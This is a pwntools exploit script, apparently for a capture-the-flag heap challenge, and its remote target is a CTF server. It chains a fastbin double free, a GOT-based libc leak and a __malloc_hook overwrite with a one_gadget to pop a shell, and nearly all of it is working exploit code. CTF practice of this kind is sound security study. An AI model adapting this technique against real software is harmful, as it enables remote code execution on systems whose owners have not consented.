#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Copyright © 2018 vam <jpwan21@gmail.com>

from pwn import *
context.log_level="debug"
pwn_file="./heaplevel4-bsschunk"
elf=ELF(pwn_file)
libc=ELF("./libc.so.6")

if len(sys.argv)==1:
    r=process(pwn_file)
    pid=r.pid
else:
    r=remote("pwn.sixstars.team", 22504)
    pid=0

def debug():
    log.debug("process pid:%d"%pid)
    pause()

def addnote(content = ''):
    r.sendlineafter(">> ","1")
    r.sendlineafter("Content: ", content)

def deletenote(nid):
    r.sendlineafter(">> ", "3")
    r.sendlineafter("Input your id:", str(nid))

def shownote(nid):
    r.sendlineafter(">> ","2")
    r.sendlineafter("Input your id:",str(nid))

addnote() #0
addnote() #1
deletenote(0) 
deletenote(1)
deletenote(0)

bss_tunck = 0x6020a5 - 0x8 

addnote(p64(bss_tunck)) #2
addnote() #3
addnote() #4

# 将pool[0]地址覆盖成puts地址
puts = 0x602020
payload1 = 'a'*3 + 'a'*0x10 + p64(puts)


addnote(payload1) #5
shownote(0)
w = r.recvline()[:-1]
puts_addr = u64(w + chr(0)*2)
libc.address = puts_addr - libc.sym["puts"]
print hex(libc.address)

#### second
addnote()
addnote()
deletenote(6)
deletenote(7)
deletenote(6)

one_gadget = libc.address + 0xf02a4

malloc_block = libc.sym['__malloc_hook'] -0x23 
addnote(p64(malloc_block))
addnote() 
addnote() 
payload2 = 'a'*19 + p64(one_gadget)
addnote(payload2)


deletenote(8)
deletenote(8)
'''
r.recvuntil(">> ")
r.sendline("3")
r.recvuntil("Input your id:")
debug()
r.sendline("3")
'''
r.interactive()

'''
1.leak a addr on bss to get libc
2.double free
'''
